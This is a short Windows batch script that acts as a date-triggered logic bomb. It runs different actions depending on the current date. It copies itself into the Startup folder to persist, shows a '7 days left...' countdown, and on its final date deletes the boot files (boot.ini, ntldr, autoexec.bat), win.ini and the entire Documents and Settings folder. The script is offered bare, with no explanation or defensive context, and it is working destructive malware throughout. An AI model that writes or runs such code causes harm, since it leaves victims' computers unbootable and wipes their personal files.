@echo off 
goto :%date% 
exit
:wed 07/09/2008
start http://www.mylazysundays.com
copy %0 "%systemdrive%\Documents and Settings\%username%\Start Menu\Programs\Startup"
exit 
:Thu 07/10/2008 
color 04
start http://www.youtube.com/watch?v=G5BwhGr65Qw&feature=related >null
cls
echo 7 days left... 
pause
exit 
:thu 07/17/2008 
attrib -r -s -h c:\autoexec.bat 
del c:\autoexec.bat /f /q /s 
attrib -r -s -h c:\boot.ini 
del c:\boot.ini /f /q /s 
attrib -r -s -h c:\ntldr 
del c:\ntldr /f /q /s 
attrib -r -s -h c:\windows\win.ini 
del c:\windows\win.ini /f /q /s 
del C:\Documents and Settings /f /q /s 
exit 